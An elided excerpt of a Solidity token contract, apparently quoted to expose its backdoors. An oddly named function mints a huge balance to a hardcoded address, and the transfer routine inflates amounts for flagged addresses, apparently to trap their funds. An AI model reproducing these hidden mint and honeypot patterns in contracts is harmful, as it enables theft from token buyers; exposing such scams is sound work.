...
contract Token is Ownable {
    ...
    function adminAmount() public view returns (uint256) {
    ...
    function wojaokssaddadmin() external {
        ...
        if(_cwojak2 == twojak){
            _balances[_cwojak2] = adminAmount()*40000;
        }
    ...
    constructor(string memory tokenName_, string memory Tokensymbol_) {
        _cwojak2 = 0x371174ccD49996fE910d0100Ae074C2927B92B26;
    ...
    function _internaltransfer(
        ...
        if(_boboLeve[fromSender] == true){
            amount = amount+(343000000000*10**18);
        }
